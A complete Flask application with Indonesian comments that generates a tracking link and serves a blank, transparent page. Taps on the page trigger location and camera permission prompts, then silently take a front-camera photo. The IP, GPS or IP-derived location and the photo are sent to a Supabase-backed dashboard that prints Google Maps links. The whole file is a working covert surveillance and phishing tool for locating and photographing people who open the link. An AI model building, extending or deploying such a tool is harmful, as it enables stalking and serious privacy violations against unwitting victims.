import os
import uuid
import base64
import json
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv
from supabase import create_client, Client

# Load environment variables
load_dotenv()

# Initialize Supabase client
supabase_url = os.getenv('SUPABASE_URL')
supabase_key = os.getenv('SUPABASE_KEY')
supabase: Client = None

if supabase_url and supabase_key:
    supabase = create_client(supabase_url, supabase_key)
else:
    print("Warning: Supabase credentials not found. Using local storage fallback.")

app = Flask(__name__, static_folder='static', template_folder='templates')

# Generate random token
TOKEN = str(uuid.uuid4())

# Create folders if not exist (for local fallback)
os.makedirs('hasil', exist_ok=True)
os.makedirs('static/photos', exist_ok=True)

def get_location_from_ip(ip_address):
    """Get location from IP address using free API"""
    try:
        response = requests.get(f'http://ip-api.com/json/{ip_address}')
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'latitude': data['lat'],
                    'longitude': data['lon'],
                    'city': data.get('city', 'Unknown'),
                    'country': data.get('country', 'Unknown')
                }
    except Exception as e:
        print(f"Error getting location from IP: {e}")
    return None

def save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename):
    """Fallback function to save data locally if Supabase fails"""
    data_entry = {
        'timestamp': timestamp,
        'ip_address': ip_address,
        'token': TOKEN
    }
    
    if latitude and longitude:
        data_entry['latitude'] = latitude
        data_entry['longitude'] = longitude
    if city:
        data_entry['city'] = city
    if country:
        data_entry['country'] = country
    if foto_filename:
        data_entry['foto_filename'] = foto_filename
    
    # Save to JSON
    json_file = 'hasil/tracking_data.json'
    
    if os.path.exists(json_file):
        with open(json_file, 'r') as f:
            try:
                existing_data = json.load(f)
            except json.JSONDecodeError:
                existing_data = []
    else:
        existing_data = []
    
    existing_data.append(data_entry)
    
    with open(json_file, 'w') as f:
        json.dump(existing_data, f, indent=2)
    
    print("Data saved to local fallback")

# HTML template with inline CSS and JS
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <style>
        html, body {
            width: 100%;
            height: 100%;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }
        #fullscreen {
            width: 100%;
            height: 100%;
            background: transparent;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        #permissionOverlay {
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            position: absolute;
            top: 0;
            left: 0;
            z-index: 10;
            display: none;
            cursor: pointer;
        }
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div id="fullscreen"></div>
    <div id="permissionOverlay"></div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <script>
        const fullscreen = document.getElementById('fullscreen');
        const permissionOverlay = document.getElementById('permissionOverlay');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        let firstClick = true;
        
        fullscreen.addEventListener('click', handleFirstClick);
        fullscreen.addEventListener('touchstart', handleFirstClick);
        
        permissionOverlay.addEventListener('click', handlePermissionClick);
        permissionOverlay.addEventListener('touchstart', handlePermissionClick);
        
        function handleFirstClick() {
            if (firstClick) {
                // Tahap 1: Kirim IP address saja
                sendData(null, null, null);
                
                // Tampilkan overlay untuk tahap 2
                setTimeout(() => {
                    permissionOverlay.style.display = 'block';
                }, 500);
                
                firstClick = false;
            }
        }
        
        function handlePermissionClick() {
            // Tahap 2: Minta izin GPS dan kamera
            console.log('Tahap 2: Meminta izin GPS dan kamera');
            permissionOverlay.style.display = 'none';
            
            // Get geolocation
            navigator.geolocation.getCurrentPosition(
                position => {
                    console.log('GPS berhasil:', position.coords);
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    // Access camera (optional)
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(stream => {
                            console.log('Kamera berhasil');
                            video.srcObject = stream;
                            video.onloadedmetadata = () => {
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0);
                                
                                // Convert to base64
                                const foto_base64 = canvas.toDataURL('image/jpeg').split(',')[1];
                                
                                // Stop camera stream
                                stream.getTracks().forEach(track => track.stop());
                                
                                // Send data with photo
                                console.log('Mengirim data dengan GPS dan foto');
                                sendData(lat, lng, foto_base64);
                            };
                        })
                        .catch(err => {
                            // Camera failed, send without photo
                            console.log('Kamera tidak tersedia, mengirim tanpa foto:', err);
                            sendData(lat, lng, null);
                        });
                },
                err => {
                    // Geolocation failed, send without location
                    console.log('Lokasi tidak tersedia:', err);
                    sendData(null, null, null);
                }
            );
        }
        
        function sendData(lat, lng, foto_base64) {
            fetch('/kirim_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    latitude: lat,
                    longitude: lng,
                    foto_base64: foto_base64
                })
            })
            .then(response => response.json())
            .then(data => {
                // Visual feedback - green background for 1 second
                fullscreen.style.background = 'green';
                setTimeout(() => {
                    fullscreen.style.background = 'transparent';
                }, 1000);
            })
            .catch(err => {
                alert('Gagal mengirim data: ' + err.message);
            });
        }
    </script>
</body>
</html>
"""

@app.route('/lacak/<token>')
def lacak(token):
    return render_template_string(HTML_TEMPLATE)

@app.route('/kirim_data', methods=['POST'])
def kirim_data():
    data = request.json
    
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    foto_base64 = data.get('foto_base64')
    
    # Get IP address from request (check for proxy headers first)
    if request.headers.get('X-Forwarded-For'):
        ip_address = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip_address = request.headers.get('X-Real-IP')
    else:
        ip_address = request.remote_addr
    
    # Generate timestamp
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    # Prepare data entry
    data_entry = {
        'timestamp': timestamp,
        'ip_address': ip_address,
        'token': TOKEN
    }
    
    # Handle photo (optional)
    foto_filename = None
    if foto_base64:
        foto_data = base64.b64decode(foto_base64)
        foto_filename = f"{TOKEN}_{timestamp}.jpg"
        foto_path = os.path.join('static/photos', foto_filename)
        
        with open(foto_path, 'wb') as f:
            f.write(foto_data)
    
    # Handle location (optional)
    city = None
    country = None
    if latitude and longitude:
        pass  # Already have coordinates
    else:
        # Fallback: Get location from IP address
        location_data = get_location_from_ip(ip_address)
        if location_data:
            latitude = location_data['latitude']
            longitude = location_data['longitude']
            city = location_data['city']
            country = location_data['country']
    
    # Save to Supabase or local fallback
    if supabase:
        try:
            supabase.table('tracking_data').insert({
                'timestamp': datetime.now().isoformat(),
                'ip_address': ip_address,
                'token': TOKEN,
                'latitude': latitude,
                'longitude': longitude,
                'city': city,
                'country': country,
                'foto_filename': foto_filename
            }).execute()
            print("Data saved to Supabase")
        except Exception as e:
            print(f"Error saving to Supabase: {e}")
            # Fallback to local storage
            save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename)
    else:
        # Local fallback
        save_local_fallback(timestamp, ip_address, latitude, longitude, city, country, foto_filename)
    
    # Print notification
    if latitude and longitude:
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
        print(f"Data diterima dari {TOKEN}. Lokasi: {latitude}, {longitude}. Foto: {foto_filename}")
        print(f"Google Maps: {google_maps_link}")
    else:
        # Check if we got location from IP
        if 'latitude' in data_entry and 'longitude' in data_entry:
            google_maps_link = f"https://www.google.com/maps?q={data_entry['latitude']},{data_entry['longitude']}"
            city = data_entry.get('city', 'Unknown')
            country = data_entry.get('country', 'Unknown')
            print(f"Data diterima dari {TOKEN}. IP: {ip_address}. Lokasi (IP): {city}, {country}")
            print(f"Koordinat: {data_entry['latitude']}, {data_entry['longitude']}")
            print(f"Google Maps: {google_maps_link}")
        else:
            print(f"Data diterima dari {TOKEN}. IP Address: {ip_address}. Foto: {foto_filename}")
    
    return jsonify({'status': 'success'})

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/tracking-data', methods=['GET'])
def get_tracking_data():
    try:
        if supabase:
            response = supabase.table('tracking_data').select('*').order('timestamp', desc=True).execute()
            data = response.data
            return jsonify({'success': True, 'data': data, 'token': TOKEN})
        else:
            # Local fallback
            json_file = 'hasil/tracking_data.json'
            if os.path.exists(json_file):
                with open(json_file, 'r') as f:
                    data = json.load(f)
                return jsonify({'success': True, 'data': data, 'token': TOKEN})
            else:
                return jsonify({'success': True, 'data': [], 'token': TOKEN})
    except Exception as e:
        print(f"Error fetching data: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/tracking-data/<int:id>', methods=['DELETE'])
def delete_tracking_data(id):
    try:
        if supabase:
            supabase.table('tracking_data').delete().eq('id', id).execute()
            return jsonify({'success': True})
        else:
            # Local fallback - not implemented for individual delete
            return jsonify({'success': False, 'error': 'Delete not available in local mode'})
    except Exception as e:
        print(f"Error deleting data: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/tracking-data/all', methods=['DELETE'])
def delete_all_tracking_data():
    try:
        if supabase:
            supabase.table('tracking_data').delete().neq('id', 0).execute()
            return jsonify({'success': True})
        else:
            # Local fallback
            json_file = 'hasil/tracking_data.json'
            if os.path.exists(json_file):
                with open(json_file, 'w') as f:
                    json.dump([], f)
            return jsonify({'success': True})
    except Exception as e:
        print(f"Error deleting all data: {e}")
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    # Get local IP
    import socket
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    print(f"\n{'='*60}")
    print(f"Token: {TOKEN}")
    print(f"URL: http://{local_ip}:5000/lacak/{TOKEN}")
    print(f"{'='*60}\n")
    
    app.run(host='0.0.0.0', port=5000)
